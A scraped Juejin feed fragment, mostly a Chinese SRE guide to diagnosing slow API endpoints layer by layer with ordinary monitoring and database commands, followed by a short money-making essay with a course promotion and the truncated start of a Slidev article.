blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当用户反馈“接口很慢”或监控告警“P99 延迟飙升”，你是否手忙脚乱？<br/>
本文提供一套<strong>结构化排查方法论</strong>，按请求流向逐层拆解，助你 30 分钟内定位根因。</p>
<blockquote>
<p>🎯 <strong>核心原则</strong>：<br/>
<strong>“先看整体，再钻细节；先外后内，先快后慢。”</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、整体策略：三步定界法</h2>
<ol>
<li><strong>确认现象</strong>：是单接口慢？还是全站慢？偶发还是持续？</li>
<li><strong>缩小范围</strong>：通过日志/监控，确定慢发生在哪一层（客户端？网络？服务端？）</li>
<li><strong>聚焦根因</strong>：在疑似层深入分析（如 DB 慢查、CPU 飙升、锁竞争等）</li>
</ol>
<hr/>
<h2 data-id="heading-1">二、分层排查详解</h2>
<h3 data-id="heading-2">第 1 层：客户端（Client）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：仅特定用户/设备慢，服务端日志显示处理很快</p>
</blockquote>
<h4 data-id="heading-3">排查点：</h4>





























<table><thead><tr><th>项目</th><th>检查方法</th></tr></thead><tbody><tr><td><strong>客户端网络</strong></td><td>用户是否在弱网环境（地铁、海外）？用 <code>ping</code> / <code>traceroute</code> 测试到网关延迟</td></tr><tr><td><strong>DNS 解析慢</strong></td><td><code>time dig your-api.com</code>，若 &gt;500ms 则 DNS 有问题</td></tr><tr><td><strong>TLS 握手慢</strong></td><td>浏览器 DevTools → Network → Timing，看 <code>SSL</code> 阶段耗时</td></tr><tr><td><strong>客户端代码阻塞</strong></td><td>前端 JS 是否在请求前做大量计算？移动端是否主线程卡顿？</td></tr><tr><td><strong>重试风暴</strong></td><td>客户端超时设置过短（如 1s），频繁重试加重服务端压力</td></tr></tbody></table>
<h4 data-id="heading-4">工具：</h4>
<ul>
<li>浏览器 DevTools（Network Tab）</li>
<li><code>curl -w "@format.txt"</code> 自定义输出各阶段耗时</li>
<li>移动端 APM（如 Firebase Performance Monitoring）</li>
</ul>
<hr/>
<h3 data-id="heading-5">第 2 层：网络（Network）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：跨区域访问慢，同机房正常</p>
</blockquote>
<h4 data-id="heading-6">排查点：</h4>





























<table><thead><tr><th>项目</th><th>检查方法</th></tr></thead><tbody><tr><td><strong>跨运营商延迟</strong></td><td>电信用户访问联通服务器？用 <code>mtr your-api.com</code> 查路由跳数和丢包</td></tr><tr><td><strong>BGP 路由异常</strong></td><td>全球多地 ping 测试（如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fping.pe%2F" target="_blank" title="https://ping.pe/" ref="nofollow noopener noreferrer">Ping.pe</a>）</td></tr><tr><td><strong>防火墙/安全组限速</strong></td><td>检查云厂商安全组是否 QoS 限流</td></tr><tr><td><strong>MTU 不匹配</strong></td><td>大包分片导致重传（少见，但可能）</td></tr><tr><td><strong>CDN 回源慢</strong></td><td>若使用 CDN，检查回源到源站的延迟</td></tr></tbody></table>
<h4 data-id="heading-7">工具：</h4>
<ul>
<li><code>mtr --report your-api.com</code></li>
<li><code>tcptraceroute your-api.com 443</code></li>
<li>云厂商网络诊断工具（阿里云 ARMS、AWS VPC Flow Logs）</li>
</ul>
<hr/>
<h3 data-id="heading-8">第 3 层：网关/负载均衡（Gateway / LB）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：所有接口慢，或特定路径慢（如 <code>/api/v1/*</code>）</p>
</blockquote>
<h4 data-id="heading-9">排查点：</h4>





























<table><thead><tr><th>项目</th><th>检查方法</th></tr></thead><tbody><tr><td><strong>网关 CPU/内存打满</strong></td><td>查看 Nginx / ALB / API Gateway 监控指标</td></tr><tr><td><strong>连接池耗尽</strong></td><td>Nginx <code>upstream</code> 连接数达到 <code>max_conns</code></td></tr><tr><td><strong>WAF/安全插件开销</strong></td><td>是否启用了正则规则扫描？关闭 WAF 测试对比</td></tr><tr><td><strong>SSL 卸载瓶颈</strong></td><td>TLS 1.3 vs 1.2 性能差异？证书链过长？</td></tr><tr><td><strong>路由配置错误</strong></td><td>请求被错误转发到低配实例？</td></tr></tbody></table>
<h4 data-id="heading-10">日志分析（Nginx 示例）：</h4>
<pre><code class="hljs language-dart" lang="dart"># 开启详细日志
log_format detailed <span class="hljs-string">'<span class="hljs-subst">$remote_addr</span> - <span class="hljs-subst">$remote_user</span> [<span class="hljs-subst">$time_local</span>] '</span>
                   <span class="hljs-string">'"<span class="hljs-subst">$request</span>" <span class="hljs-subst">$status</span> <span class="hljs-subst">$body_bytes_sent</span> '</span>
                   <span class="hljs-string">'"<span class="hljs-subst">$http_referer</span>" "<span class="hljs-subst">$http_user_agent</span>" '</span>
                   <span class="hljs-string">'rt=<span class="hljs-subst">$request_time</span> uct="<span class="hljs-subst">$upstream_connect_time</span>" '</span>
                   <span class="hljs-string">'uht="<span class="hljs-subst">$upstream_header_time</span>" urt="<span class="hljs-subst">$upstream_response_time</span>"'</span>;

access_log /<span class="hljs-keyword">var</span>/log/nginx/access.log detailed;
</code></pre>
<blockquote>
<p>🔍 关键字段：</p>
<ul>
<li><code>$request_time</code>：总耗时</li>
<li><code>$upstream_response_time</code>：后端服务耗时<br/>
<strong>若前者 &gt;&gt; 后者 → 网关层问题</strong></li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-11">第 4 层：服务端应用（Application）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：接口逻辑复杂，日志显示处理时间长</p>
</blockquote>
<h4 data-id="heading-12">排查点：</h4>





























<table><thead><tr><th>项目</th><th>检查方法</th></tr></thead><tbody><tr><td><strong>代码性能瓶颈</strong></td><td>是否有 O(n²) 循环？重复计算？未缓存结果？</td></tr><tr><td><strong>同步阻塞调用</strong></td><td>在 HTTP 线程中调用外部 API、DB、文件 IO？</td></tr><tr><td><strong>GC 频繁</strong></td><td>Java Full GC、Go GC STW 时间过长？</td></tr><tr><td><strong>线程池耗尽</strong></td><td>Tomcat 线程池满，新请求排队？</td></tr><tr><td><strong>日志打印过多</strong></td><td>生产环境 DEBUG 日志拖慢性能？</td></tr></tbody></table>
<h4 data-id="heading-13">工具：</h4>
<ul>
<li>
<p><strong>APM 工具</strong>（必用！）：</p>
<ul>
<li>Java: SkyWalking, Pinpoint, Arthas</li>
<li>Go: pprof, Pyroscope</li>
<li>Python: py-spy, OpenTelemetry</li>
</ul>
</li>
<li>
<p><strong>火焰图（Flame Graph）</strong> ：直观展示 CPU 热点</p>
</li>
<li>
<p><strong>链路追踪（Tracing）</strong> ：查看 Span 耗时分布</p>
</li>
</ul>
<blockquote>
<p>💡 示例（Arthas 监控方法耗时）：</p>
<pre><code class="hljs">trace com.example.service.UserService getUserById
</code></pre>
</blockquote>
<hr/>
<h3 data-id="heading-14">第 5 层：系统资源（OS / Host）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：整机变慢，多个服务受影响</p>
</blockquote>
<h4 data-id="heading-15">排查点：</h4>



































<table><thead><tr><th>资源</th><th>检查命令</th><th>异常表现</th></tr></thead><tbody><tr><td><strong>CPU</strong></td><td><code>top</code>, <code>htop</code></td><td>%sys 高（内核态）、%iowait 高（磁盘瓶颈）</td></tr><tr><td><strong>内存</strong></td><td><code>free -h</code>, <code>vmstat 1</code></td><td>swap 使用 &gt;0，频繁 page-in/out</td></tr><tr><td><strong>磁盘 IO</strong></td><td><code>iostat -x 1</code>, <code>iotop</code></td><td><code>%util &gt; 90%</code>, <code>await &gt; 20ms</code></td></tr><tr><td><strong>网络带宽</strong></td><td><code>iftop</code>, <code>nethogs</code></td><td>出/入带宽打满</td></tr><tr><td><strong>文件描述符</strong></td><td>`lsof</td><td>wc -l<code>, </code>cat /proc/sys/fs/file-nr`</td></tr></tbody></table>
<h4 data-id="heading-16">关键指标：</h4>
<ul>
<li><strong>Load Average</strong>：&gt; CPU 核数 × 2 可能存在瓶颈</li>
<li><strong>Context Switches</strong>：<code>vmstat</code> 中 <code>cs</code> 列突增 → 线程竞争激烈</li>
</ul>
<hr/>
<h3 data-id="heading-17">第 6 层：中间件（Middleware）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：涉及缓存、消息队列、RPC 调用的接口慢</p>
</blockquote>
<h4 data-id="heading-18">常见中间件排查：</h4>

























<table><thead><tr><th>中间件</th><th>排查重点</th></tr></thead><tbody><tr><td><strong>Redis</strong></td><td>- 慢查询（<code>SLOWLOG GET</code>） - 大 Key 阻塞（<code>MEMORY USAGE key</code>） - 连接池耗尽</td></tr><tr><td><strong>Kafka</strong></td><td>- 分区 Leader 不可用 - Consumer Lag 积压 - 网络往返延迟高</td></tr><tr><td><strong>RabbitMQ</strong></td><td>- Queue 积压 - 消费者处理慢 - 内存告警（flow control）</td></tr><tr><td><strong>gRPC / Dubbo</strong></td><td>- 序列化开销大（Protobuf vs JSON） - 连接未复用</td></tr></tbody></table>
<h4 data-id="heading-19">通用方法：</h4>
<ul>
<li><strong>中间件监控面板</strong>（如 RedisInsight, Kafka Manager）</li>
<li><strong>客户端埋点</strong>：记录中间件调用耗时（如 <code>redis.get(key)</code> 耗时）</li>
</ul>
<hr/>
<h3 data-id="heading-20">第 7 层：数据库（Database）</h3>
<blockquote>
<p>✅ <strong>问题特征</strong>：接口包含 DB 查询，且 DB 负载高</p>
</blockquote>
<h4 data-id="heading-21">排查点：</h4>





























<table><thead><tr><th>项目</th><th>检查方法</th></tr></thead><tbody><tr><td><strong>慢 SQL</strong></td><td>MySQL: <code>slow_query_log</code>；PostgreSQL: <code>log_min_duration_statement</code></td></tr><tr><td><strong>缺失索引</strong></td><td><code>EXPLAIN</code> 执行计划出现 <code>Seq Scan</code> / <code>Using filesort</code></td></tr><tr><td><strong>锁竞争</strong></td><td>MySQL: <code>SHOW ENGINE INNODB STATUS</code>；死锁日志</td></tr><tr><td><strong>连接池耗尽</strong></td><td>应用报 <code>Too many connections</code></td></tr><tr><td><strong>大事务</strong></td><td>单事务修改百万行，阻塞其他操作</td></tr></tbody></table>
<h4 data-id="heading-22">快速诊断命令（MySQL）：</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看当前运行的慢查询</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.processlist 
<span class="hljs-keyword">WHERE</span> <span class="hljs-type">TIME</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> <span class="hljs-keyword">AND</span> COMMAND <span class="hljs-operator">!=</span> <span class="hljs-string">'Sleep'</span>;

<span class="hljs-comment">-- 查看 InnoDB 锁等待</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> sys.innodb_lock_waits;
</code></pre>
<h4 data-id="heading-23">工具：</h4>
<ul>
<li><strong>Percona Toolkit</strong>（<code>pt-query-digest</code> 分析慢日志）</li>
<li><strong>Prometheus + Grafana</strong>（监控 QPS、连接数、缓冲池命中率）</li>
</ul>
<hr/>
<h2 data-id="heading-24">三、实战案例：一个慢接口的完整排查过程</h2>
<h3 data-id="heading-25">现象：</h3>
<ul>
<li>接口 <code>/api/order/detail</code> P99 从 200ms → 5s</li>
<li>仅该接口慢，其他正常</li>
</ul>
<h3 data-id="heading-26">排查步骤：</h3>
<ol>
<li><strong>客户端</strong>：前端 DevTools 显示 TTFB（Time To First Byte）= 4.8s → 问题在服务端</li>
<li><strong>网关</strong>：Nginx 日志 <code>$upstream_response_time = 4.7s</code> → 网关无瓶颈</li>
<li><strong>服务端</strong>：APM 显示 <code>OrderService.getDetail()</code> 耗时 4.6s</li>
<li><strong>代码分析</strong>：该方法内调用 <code>userClient.getUser(userId)</code>（远程 RPC）</li>
<li><strong>RPC 中间件</strong>：发现 <code>userClient</code> 超时设为 5s，实际耗时 4.5s</li>
<li><strong>用户服务</strong>：APM 显示 <code>UserService.getUser()</code> 中 <code>SELECT * FROM users WHERE id=?</code> 耗时 4.4s</li>
<li><strong>数据库</strong>：<code>EXPLAIN</code> 发现 <code>users.id</code> 无主键（误删）→ 全表扫描 1000 万行！</li>
</ol>
<h3 data-id="heading-27">根因：<strong>数据库主键丢失导致全表扫描</strong></h3>
<h3 data-id="heading-28">解决：重建主键，添加监控告警“无主键表”。</h3>
<hr/>
<h2 data-id="heading-29">四、预防措施：让慢接口无处藏身</h2>





























<table><thead><tr><th>层级</th><th>预防手段</th></tr></thead><tbody><tr><td><strong>客户端</strong></td><td>设置合理超时（如 3s），降级方案</td></tr><tr><td><strong>网络</strong></td><td>多可用区部署，BGP Anycast</td></tr><tr><td><strong>网关</strong></td><td>限流熔断（Sentinel, Hystrix）</td></tr><tr><td><strong>服务端</strong></td><td>APM 全链路监控 + 告警（P99 &gt; 1s）</td></tr><tr><td><strong>数据库</strong></td><td>慢 SQL 自动捕获 + 索引推荐</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-30">五、总结：慢接口排查 Checklist</h2>
<p>✅ <strong>第一步：确认范围</strong></p>
<ul>
<li>单接口 or 全站？偶发 or 持续？</li>
</ul>
<p>✅ <strong>第二步：看网关日志</strong></p>
<ul>
<li><code>$request_time</code> vs <code>$upstream_response_time</code></li>
</ul>
<p>✅ <strong>第三步：查 APM 链路</strong></p>
<ul>
<li>哪个 Span 耗时最长？</li>
</ul>
<p>✅ <strong>第四步：钻取瓶颈层</strong></p>
<ul>
<li>DB？中间件？系统资源？</li>
</ul>
<p>✅ <strong>第五步：复现 &amp; 验证</strong></p>
<ul>
<li>修复后压测验证</li>
</ul>
<blockquote>
<p>🌟 <strong>记住</strong>：<br/>
<strong>“没有监控的系统，就是在黑暗中开车。”</strong><br/>
建立完善的可观测性体系（Metrics + Logs + Traces），是高效排查的前提。</p>
</blockquote>
<hr/>
<p><strong>延伸阅读</strong>：</p>
<ul>
<li>《Site Reliability Engineering》第 11 章：Managing Incidents</li>
<li>OpenTelemetry 官方文档</li>
<li>MySQL 高性能索引策略</li>
</ul>
<hr/>
<blockquote>
<p><strong>作者</strong>：SRE 工程师<br/>
<strong>更新日期</strong>：2026 年 2 月<br/>
<strong>版权声明</strong>：本文可自由转载，但请保留出处。</p>
</blockquote>
<p>如果你希望我提供 <strong>自动化慢接口诊断脚本模板</strong> 或 <strong>Prometheus 告警规则示例</strong>，欢迎继续提问！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你这一生到底该如何赚钱？]]></title>    <link>https://juejin.cn/post/7603201727715082292</link>    <guid>https://juejin.cn/post/7603201727715082292</guid>    <pubDate>2026-02-05T15:26:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603201727715082292" data-draft-id="7602991346586107938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你这一生到底该如何赚钱？"/> <meta itemprop="keywords" content="创业,AIGC"/> <meta itemprop="datePublished" content="2026-02-05T15:26:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="袁庭新"/> <meta itemprop="url" content="https://juejin.cn/user/1207714136735408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你这一生到底该如何赚钱？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1207714136735408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    袁庭新
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:26:21.000Z" title="Thu Feb 05 2026 15:26:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是袁庭新。</p>
<p>赚钱是每个成年人每天的头等大事，那你有没有认真思考过：你这一辈子到底应该如何赚钱？根据这几年的总结，我认为赚钱的方式无非以下三种：</p>
<ul>
<li>用时间赚钱</li>
<li>用金钱赚钱</li>
<li>用金钱和时间一起赚钱</li>
</ul>
<p>这三种赚钱方式的回报是不一样的，它们依次越来越大，最牛的就是用“时间+金钱”赚钱。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d4a58e0870b44a8b37a72baa7b15e32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770909981&amp;x-signature=yGWZYZoVeNg0s8SoS54glDzwt0s%3D" alt="" loading="lazy"/></p>
<p>我们绝大多数人一生摆脱不了“用时间赚钱”这种模式，想要获得更多回报就低拼命上班加班。但，用时间赚钱的方式是可以改良的，最核心的策略就是“想尽一切办法把自己的同一份时间出售很多次”，举几个例子吧，比如：讲课、写书、专利等，都是“用时间赚钱”模式的改良升级。</p>
<p>但讲课、写书和发明专利，已经超出了绝大多数普通人的能力范围。运用下“退而求次”策略，我们：做销售！把优质产品销售很多次并从中获利。为什么我推荐的是“做销售”呢？因为销售是一个唯一不看学历不看家庭背景，同时也不需要成本投入，对普通人来说最简单直接粗暴有效的赚钱方式。</p>
<p>以前，我还在做软件开发工程师的时候，最讨厌的就是销售，更讨厌做销售的人，现在看来是多么幼稚可笑。做销售是一个人逐步提高自己收入的最靠谱的途径。现在我觉得，能把一样东西通过合法的手段卖出去太了不起了，并且我悠然的敬佩。你看面对同一个事物，前后我竟是截然不同的态度，因为我的大脑升级了。</p>
<p>新的问题又来了，我们如何选择销售标的呢？考虑两个问题就够了，第一个：客户终生价值到底有多高？有没有可能提高很多？第二个：客户数量到底有多大？能不能继续扩大？在选择销售什么产品的时候，如果你始终能牢记这两条，你一下子就掌握了赚钱的诀窍，就这么厉害。</p>
<p>长期以来，我讲的都是“软件开发工程师”的内容，一直想讲一门关于“如何赚钱”的课，为此我足足准备了两年时间。我相信只要一个人不断成长，那么，他的赚钱能力就会相应地不断加强。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7495aefd7104e58a338f62058227dca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770909981&amp;x-signature=UMafIIdjsWNjkkTPwIiIGB4H9T8%3D" alt="" loading="lazy"/></p>
<p>算了算，我已经讲了8年的课了，这些年大大小小讲了60多门课程，但是如果只推荐一门课，毫无疑问那就是这门《微信商业生态平民创业》，竟不是我的编程课。感兴趣的朋友可以通过识别下图开启学习之旅。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb2772df5ae74fa29f7263065ef0f656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770909981&amp;x-signature=dpRW%2FKt%2Ff7rTYkEHsSYTayATiLA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Slidev：开发者专属的演示文稿神器]]></title>    <link>https://juejin.cn/post/7602991346586206242</link>    <guid>https://juejin.cn/post/7602991346586206242</guid>    <pubDate>2026-02-05T15:58:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602991346586206242" data-draft-id="7602965400810160178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Slidev：开发者专属的演示文稿神器"/> <meta itemprop="keywords" content="Markdown"/> <meta itemprop="datePublished" content="2026-02-05T15:58:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Slidev：开发者专属的演示文稿神器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:58:28.000Z" title="Thu Feb 05 2026 15:58:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
